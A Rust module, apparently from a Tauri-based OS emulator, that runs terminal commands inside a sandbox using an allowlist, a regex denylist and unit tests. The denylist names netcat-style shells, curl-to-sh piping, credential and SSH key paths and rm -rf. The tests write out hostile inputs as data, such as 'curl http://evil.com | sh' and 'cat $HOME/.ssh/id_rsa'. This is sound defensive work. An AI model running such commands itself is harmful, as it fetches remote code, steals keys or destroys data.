// ──────────────────────────────────────────────────────────
// [Clean Architecture] Infrastructure Layer - Adapter
//
// 역할: 터미널 명령 실행 (샌드박스 내, allowlist + denylist 필터링)
// 수행범위: 허용된 명령을 직접 execvp로 실행. 셸 인터프리터 없음.
//           단순 파이프(|) 지원. ';' / '&&' / '||' 는 순차 실행.
// 의존방향: state (mount_point)
// SOLID: SRP — 명령 실행만 담당
//
// 클린아키텍처, SOLID원칙, i18n 규칙 철저 준수
// 에뮬레이터는 실제 디바이스 구동 환경 제공이 목적이며, OS 이미지 영역의 콘텐츠를 포함하지 않는다
// ──────────────────────────────────────────────────────────

use crate::state::AppState;
use regex::Regex;
use serde::Serialize;
use std::process::{Command, Stdio};
use std::sync::Mutex;
use tauri::State;

#[derive(Debug, Serialize)]
pub struct ExecResult {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
}

impl ExecResult {
    fn empty() -> Self {
        ExecResult { stdout: String::new(), stderr: String::new(), exit_code: 0 }
    }
}

/// Allowed command binaries — only these can be the first word of a command.
/// Shell interpreters (sh, bash, python, python3, node) are intentionally excluded:
/// they allow arbitrary code execution via -c argument injection and cannot be
/// safely restricted via an allowlist.
const ALLOWED_COMMANDS: &[&str] = &[
    // POSIX/coreutils
    "ls", "cat", "head", "tail", "wc", "sort", "uniq", "grep", "egrep", "fgrep",
    "find", "xargs", "echo", "printf", "date", "cal", "env", "printenv",
    "pwd", "basename", "dirname", "realpath", "readlink",
    "cut", "tr", "sed", "awk", "diff", "comm", "paste", "join", "tee",
    "touch", "mkdir", "cp", "mv", "ln", "stat", "file", "du", "df",
    "true", "false", "test", "[", "seq", "yes", "sleep",
    // Text viewers (read-only)
    "less", "more",
    // File content inspection
    "md5sum", "sha256sum", "base64", "od", "hexdump", "xxd", "strings",
    // Compression (safe subset)
    "gzip", "gunzip", "zcat", "bzip2", "bunzip2", "xz", "unxz",
    "tar", "zip", "unzip",
    // System info (read-only)
    "uname", "hostname", "whoami", "id", "uptime", "free",
    "ps", "lscpu", "lsblk", "mount", "ip",
    // Zyl OS specific
    "zyl-shell",
];

/// Deny patterns — checked against the FULL command string.
/// Regex-based to prevent trivial bypasses.
fn build_deny_patterns() -> Vec<Regex> {
    let patterns = [
        // ── Shell / command injection ──
        // Command substitution — these would execute arbitrary code even without sh in PATH
        r"\$\s*\(",                       // $(...)  subshell
        r"`[^`]*`",                       // `backtick` subshell
        r"\$\{[^}]*\}",                   // ${VAR} variable/command expansion
        r"\$[A-Za-z_][A-Za-z0-9_]*",     // $VAR variable expansion
        // Process substitution
        r"<\s*\(",                        // <(cmd)
        r">\s*\(",                        // >(cmd)
        // Explicit shell invocation (belt-and-suspenders, since they are not in ALLOWED_COMMANDS)
        r"\b(sh|bash|zsh|dash|ksh|csh|tcsh|fish)\b",
        r"\b(python[23]?|node|perl|ruby|lua|tclsh|expect)\b",
        // ── Recursive destructive operations ──
        r"rm\s+.*-[^\s]*r[^\s]*f",       // rm with -rf in any order
        r"rm\s+.*-[^\s]*f[^\s]*r",       // rm with -fr in any order
        r"rm\s+-rf\b",
        r"rm\s+-r\s+/",
        // Filesystem formatting
        r"\bmkfs\b",
        r"\bdd\s+if=",
        // Device writes
        r">\s*/dev/",
        // I/O redirection to absolute paths outside cwd
        r">+\s*/[a-zA-Z]",
        // Permission bombs
        r"chmod\s+.*777\s+/",
        r"chmod\s+-R\s+777",
        r"chown\s+-R\s",
        // Fork bombs
        r":\(\)\s*\{",
        r"\.\s*\(\)\s*\{",
        // System state
        r"\bshutdown\b",
        r"\breboot\b",
        r"\bhalt\b",
        r"\binit\s+[06]\b",
        r"\bpoweroff\b",
        r"\bsystemctl\s+(halt|poweroff|reboot|suspend|hibernate)",
        // Privilege escalation
        r"\bsudo\b",
        r"\bsu\s",
        r"\bsu$",
        r"\bpasswd\b",
        r"\bpkexec\b",
        r"\bdoas\b",
        // Dangerous network piping
        r"\bcurl\b.*\|\s*(sh|bash|zsh)",
        r"\bwget\b.*\|\s*(sh|bash|zsh)",
        r"\bcurl\b.*-o\s*/",
        r"\bwget\b.*-O\s*/",
        // Network listeners
        r"\bnc\s+-l",
        r"\bncat\b",
        r"\bsocat\b",
        r"\bnetcat\b",
        // Sensitive file access
        r"/etc/shadow",
        r"/etc/passwd",
        r"/etc/sudoers",
        r"/proc/kcore",
        r"/dev/mem",
        r"/dev/kmem",
        // Escape attempts
        r"\bchroot\b",
        r"\bnsenter\b",
        r"\bunshare\b",
        // Kernel manipulation
        r"\binsmod\b",
        r"\brmmod\b",
        r"\bmodprobe\b",
        r"\bsysctl\s+-w",
        // History/credential theft
        r"\.bash_history",
        r"\.ssh/",
        r"\.gnupg/",
        // Path traversal
        r"\.\./\.\./",
    ];

    patterns
        .iter()
        .filter_map(|p| Regex::new(p).ok())
        .collect()
}

/// Extract the base command name from a single command token (no operators).
/// Handles: "command args", "VAR=val command args", "/path/to/command args"
fn extract_command_name(command: &str) -> &str {
    let trimmed = command.trim();

    // Skip leading env-var assignments (VAR=val ...)
    let mut rest = trimmed;
    loop {
        let word_end = rest.find(|c: char| c.is_whitespace()).unwrap_or(rest.len());
        let word = &rest[..word_end];
        if word.contains('=') && !word.starts_with('=') {
            rest = rest[word_end..].trim_start();
            if rest.is_empty() {
                return "";
            }
        } else {
            break;
        }
    }

    let word_end = rest.find(|c: char| c.is_whitespace()).unwrap_or(rest.len());
    let cmd = &rest[..word_end];
    cmd.rsplit('/').next().unwrap_or(cmd)
}

/// Validate a command string (full, may contain operators).
/// Returns Ok(()) if allowed, Err(reason) if blocked.
fn validate_command(command: &str, deny_patterns: &[Regex]) -> Result<(), String> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Ok(());
    }

    // First: reject any deny pattern matches on the full string
    let lower = trimmed.to_lowercase();
    for pattern in deny_patterns {
        if pattern.is_match(&lower) {
            return Err(format!(
                "zyl-shell: command blocked by security policy: {}",
                trimmed.split_whitespace().next().unwrap_or("")
            ));
        }
    }

    // Second: validate the command name in each segment against the allowlist
    let segments = split_command_segments(trimmed);
    for segment in &segments {
        let seg = segment.trim();
        if seg.is_empty() {
            continue;
        }
        let cmd_name = extract_command_name(seg);
        if !cmd_name.is_empty() && !ALLOWED_COMMANDS.contains(&cmd_name) {
            return Err(format!(
                "zyl-shell: command not allowed: '{}'. Only approved commands are permitted.",
                cmd_name
            ));
        }
    }

    Ok(())
}

/// Tokenize a single command segment (no operators) into executable + args.
/// Handles single-quoted and double-quoted strings. Does NOT perform shell
/// expansion — variable references, subshell substitution etc. are passed
/// through literally, but the deny-pattern pass already rejected them.
fn tokenize_command(command: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = command.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '\'' if !in_double => {
                in_single = !in_single;
            }
            '"' if !in_single => {
                in_double = !in_double;
            }
            '\\' if !in_single => {
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            }
            ' ' | '\t' if !in_single && !in_double => {
                if !current.is_empty() {
                    tokens.push(current.clone());
                    current.clear();
                }
            }
            _ => current.push(c),
        }
    }
    if !current.is_empty() {
        tokens.push(current);
    }
    tokens
}

/// Split a command string on shell operators (;, &&, ||, |) without splitting
/// inside quotes. Returns (segments, operators) where operators[i] is the
/// operator that follows segments[i]. The last segment has no trailing operator.
fn split_command_segments(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = command.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '\'' if !in_double => {
                in_single = !in_single;
                current.push(c);
            }
            '"' if !in_single => {
                in_double = !in_double;
                current.push(c);
            }
            '\\' if !in_single => {
                current.push(c);
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            }
            ';' if !in_single && !in_double => {
                segments.push(current.clone());
                current.clear();
            }
            '&' if !in_single && !in_double => {
                if chars.peek() == Some(&'&') {
                    chars.next();
                    segments.push(current.clone());
                    current.clear();
                } else {
                    current.push(c);
                }
            }
            '|' if !in_single && !in_double => {
                if chars.peek() == Some(&'|') {
                    chars.next();
                    segments.push(current.clone());
                    current.clear();
                } else {
                    segments.push(current.clone());
                    current.clear();
                }
            }
            _ => current.push(c),
        }
    }
    if !current.is_empty() {
        segments.push(current);
    }
    segments
}

/// Execute a single command segment directly (no shell). Returns Output.
fn run_single(tokens: &[String], cwd: &std::path::Path) -> Result<std::process::Output, String> {
    if tokens.is_empty() {
        return Err("Empty command".into());
    }
    Command::new(&tokens[0])
        .args(&tokens[1..])
        .current_dir(cwd)
        .env_clear()
        .env("HOME", cwd)
        .env("PATH", "/usr/local/bin:/usr/bin:/bin")
        .env("TERM", "xterm-256color")
        .env("LANG", "en_US.UTF-8")
        .env("SHELL", "none") // no shell available in sandbox
        .output()
        .map_err(|e| format!("zyl-shell: exec '{}': {}", tokens[0], e))
}

/// Execute segments split by `|` (pipe), chaining stdout→stdin.
/// Returns the stdout/stderr/exit_code of the LAST segment.
fn run_piped(pipe_segments: &[String], cwd: &std::path::Path) -> Result<ExecResult, String> {
    let n = pipe_segments.len();
    if n == 0 {
        return Ok(ExecResult::empty());
    }
    if n == 1 {
        let tokens = tokenize_command(pipe_segments[0].trim());
        let out = run_single(&tokens, cwd)?;
        return Ok(ExecResult {
            stdout: String::from_utf8_lossy(&out.stdout).to_string(),
            stderr: String::from_utf8_lossy(&out.stderr).to_string(),
            exit_code: out.status.code().unwrap_or(-1),
        });
    }

    // Multi-segment pipe chain
    let mut prev_stdout: Option<std::process::ChildStdout> = None;
    let mut children: Vec<std::process::Child> = Vec::with_capacity(n);

    for (i, seg) in pipe_segments.iter().enumerate() {
        let tokens = tokenize_command(seg.trim());
        if tokens.is_empty() {
            continue;
        }

        let stdin_src = if let Some(ps) = prev_stdout.take() {
            Stdio::from(ps)
        } else {
            Stdio::null()
        };

        let is_last = i == n - 1;
        let mut cmd = Command::new(&tokens[0]);
        cmd.args(&tokens[1..])
            .current_dir(cwd)
            .env_clear()
            .env("HOME", cwd)
            .env("PATH", "/usr/local/bin:/usr/bin:/bin")
            .env("TERM", "xterm-256color")
            .env("LANG", "en_US.UTF-8")
            .env("SHELL", "none")
            .stdin(stdin_src)
            .stderr(Stdio::piped());

        if !is_last {
            cmd.stdout(Stdio::piped());
        }

        let mut child = cmd
            .spawn()
            .map_err(|e| format!("zyl-shell: exec '{}': {}", tokens[0], e))?;

        if !is_last {
            prev_stdout = child.stdout.take();
        }
        children.push(child);
    }

    // Collect output from each child; capture last child's result
    let last_idx = children.len().saturating_sub(1);
    let mut result = ExecResult::empty();

    for (i, child) in children.into_iter().enumerate() {
        match child.wait_with_output() {
            Ok(out) => {
                if i == last_idx {
                    result = ExecResult {
                        stdout: String::from_utf8_lossy(&out.stdout).to_string(),
                        stderr: String::from_utf8_lossy(&out.stderr).to_string(),
                        exit_code: out.status.code().unwrap_or(-1),
                    };
                }
            }
            Err(e) => {
                if i == last_idx {
                    result = ExecResult {
                        stdout: String::new(),
                        stderr: format!("zyl-shell: wait error: {}", e),
                        exit_code: 1,
                    };
                }
            }
        }
    }

    Ok(result)
}

/// 쉘 명령 실행 (샌드박스: 마운트 포인트 내에서만, allowlist + denylist 검증)
/// 
/// Security: Commands are executed directly via execvp — no shell interpreter
/// is used. This eliminates shell injection via $(), backticks, and variable
/// expansion. Pipe chains (cmd1 | cmd2) are supported via process chaining.
/// Sequential operators (;, &&, ||) execute segments sequentially.
#[tauri::command]
pub fn exec_command(
    command: String,
    state: State<'_, Mutex<AppState>>,
) -> Result<ExecResult, String> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Ok(ExecResult::empty());
    }

    let deny_patterns = build_deny_patterns();

    if let Err(reason) = validate_command(trimmed, &deny_patterns) {
        return Ok(ExecResult {
            stdout: String::new(),
            stderr: reason,
            exit_code: 126,
        });
    }

    let cwd = {
        let app_state = state.lock().map_err(|e| format!("Lock error: {}", e))?;
        app_state
            .mount_point
            .clone()
            .unwrap_or_else(|| std::env::temp_dir())
    };

    // Re-split by the original split_command_segments which tracks ; && || | equally.
    // We need to differentiate pipes from sequential operators.
    // Strategy: split into "pipeline groups" separated by ; && ||, then within
    // each group handle | chaining.
    let seq_segments = split_sequential(trimmed);
    if seq_segments.is_empty() {
        return Ok(ExecResult::empty());
    }

    // Execute each sequential segment; concatenate results
    let mut combined_stdout = String::new();
    let mut combined_stderr = String::new();
    let mut last_exit = 0i32;

    for seq_seg in &seq_segments {
        let seg = seq_seg.trim();
        if seg.is_empty() {
            continue;
        }
        // Split the sequential segment by pipe
        let pipe_parts = split_pipe_only(seg);
        match run_piped(&pipe_parts, &cwd) {
            Ok(result) => {
                combined_stdout.push_str(&result.stdout);
                combined_stderr.push_str(&result.stderr);
                last_exit = result.exit_code;
            }
            Err(e) => {
                combined_stderr.push_str(&e);
                combined_stderr.push('\n');
                last_exit = 127;
            }
        }
    }

    Ok(ExecResult {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code: last_exit,
    })
}

/// Split on ; && || (but NOT |), respecting quotes.
fn split_sequential(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = command.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '\'' if !in_double => { in_single = !in_single; current.push(c); }
            '"' if !in_single => { in_double = !in_double; current.push(c); }
            '\\' if !in_single => {
                current.push(c);
                if let Some(next) = chars.next() { current.push(next); }
            }
            ';' if !in_single && !in_double => {
                segments.push(current.clone());
                current.clear();
            }
            '&' if !in_single && !in_double => {
                if chars.peek() == Some(&'&') {
                    chars.next();
                    segments.push(current.clone());
                    current.clear();
                } else {
                    current.push(c);
                }
            }
            '|' if !in_single && !in_double => {
                if chars.peek() == Some(&'|') {
                    chars.next();
                    segments.push(current.clone());
                    current.clear();
                } else {
                    // This is a pipe — keep it in the current sequential segment
                    current.push(c);
                }
            }
            _ => current.push(c),
        }
    }
    if !current.is_empty() {
        segments.push(current);
    }
    segments
}

/// Split on pipe (|) only, respecting quotes. Used within one sequential segment.
fn split_pipe_only(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = command.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '\'' if !in_double => { in_single = !in_single; current.push(c); }
            '"' if !in_single => { in_double = !in_double; current.push(c); }
            '\\' if !in_single => {
                current.push(c);
                if let Some(next) = chars.next() { current.push(next); }
            }
            '|' if !in_single && !in_double => {
                // Only split on single `|`, not `||` (those were already handled in split_sequential)
                if chars.peek() != Some(&'|') {
                    segments.push(current.clone());
                    current.clear();
                } else {
                    current.push(c);
                }
            }
            _ => current.push(c),
        }
    }
    if !current.is_empty() {
        segments.push(current);
    }
    segments
}

// ────────────────────────────────────────────────────────────────────────────
// Unit tests
// ────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn deny() -> Vec<Regex> {
        build_deny_patterns()
    }

    // ── Allowlist tests ──

    #[test]
    fn test_allowed_ls() {
        assert!(validate_command("ls -la", &deny()).is_ok());
    }

    #[test]
    fn test_allowed_grep_pipe() {
        assert!(validate_command("cat /etc/hosts | grep localhost", &deny()).is_ok());
    }

    #[test]
    fn test_allowed_sequential() {
        assert!(validate_command("ls; echo done", &deny()).is_ok());
    }

    // ── Shell interpreter block ──

    #[test]
    fn test_blocked_sh() {
        let result = validate_command("sh -c 'id'", &deny());
        assert!(result.is_err(), "sh must be blocked");
    }

    #[test]
    fn test_blocked_bash() {
        let result = validate_command("bash -c whoami", &deny());
        assert!(result.is_err(), "bash must be blocked");
    }

    #[test]
    fn test_blocked_python3() {
        let result = validate_command("python3 -c 'import os'", &deny());
        assert!(result.is_err(), "python3 must be blocked");
    }

    #[test]
    fn test_blocked_node() {
        let result = validate_command("node -e 'require(\"child_process\")'", &deny());
        assert!(result.is_err(), "node must be blocked");
    }

    // ── Subshell injection block ──

    #[test]
    fn test_blocked_subshell_dollar_paren() {
        let result = validate_command("ls $(id)", &deny());
        assert!(result.is_err(), "$() must be blocked");
    }

    #[test]
    fn test_blocked_subshell_backtick() {
        let result = validate_command("ls `id`", &deny());
        assert!(result.is_err(), "backtick must be blocked");
    }

    #[test]
    fn test_blocked_variable_expansion() {
        let result = validate_command("cat $HOME/.ssh/id_rsa", &deny());
        assert!(result.is_err(), "variable expansion must be blocked");
    }

    // ── Dangerous pattern block ──

    #[test]
    fn test_blocked_rm_rf() {
        let result = validate_command("rm -rf /tmp", &deny());
        assert!(result.is_err(), "rm -rf must be blocked");
    }

    #[test]
    fn test_blocked_shadow() {
        let result = validate_command("cat /etc/shadow", &deny());
        assert!(result.is_err(), "/etc/shadow must be blocked");
    }

    #[test]
    fn test_blocked_curl_pipe_sh() {
        let result = validate_command("curl http://evil.com | sh", &deny());
        assert!(result.is_err(), "curl | sh must be blocked");
    }

    // ── Tokenizer ──

    #[test]
    fn test_tokenize_simple() {
        let tokens = tokenize_command("ls -la /tmp");
        assert_eq!(tokens, vec!["ls", "-la", "/tmp"]);
    }

    #[test]
    fn test_tokenize_single_quotes() {
        let tokens = tokenize_command("grep 'hello world' file.txt");
        assert_eq!(tokens, vec!["grep", "hello world", "file.txt"]);
    }

    #[test]
    fn test_tokenize_double_quotes() {
        let tokens = tokenize_command(r#"echo "hello world""#);
        assert_eq!(tokens, vec!["echo", "hello world"]);
    }

    // ── Segment splitters ──

    #[test]
    fn test_split_sequential() {
        let segs = split_sequential("ls; echo done");
        assert_eq!(segs.len(), 2);
        assert_eq!(segs[0].trim(), "ls");
        assert_eq!(segs[1].trim(), "echo done");
    }

    #[test]
    fn test_split_pipe_only() {
        let segs = split_pipe_only("cat file | grep foo");
        assert_eq!(segs.len(), 2);
        assert_eq!(segs[0].trim(), "cat file");
        assert_eq!(segs[1].trim(), "grep foo");
    }

    #[test]
    fn test_pipe_not_split_sequential() {
        // `|` inside sequential split should remain in the segment
        let segs = split_sequential("cat file | grep foo");
        assert_eq!(segs.len(), 1, "pipe should not be treated as sequential separator");
    }

    #[test]
    fn test_extract_command_name_with_path() {
        assert_eq!(extract_command_name("/usr/bin/grep foo"), "grep");
    }

    #[test]
    fn test_extract_command_name_with_env_var() {
        assert_eq!(extract_command_name("FOO=bar ls"), "ls");
    }
}
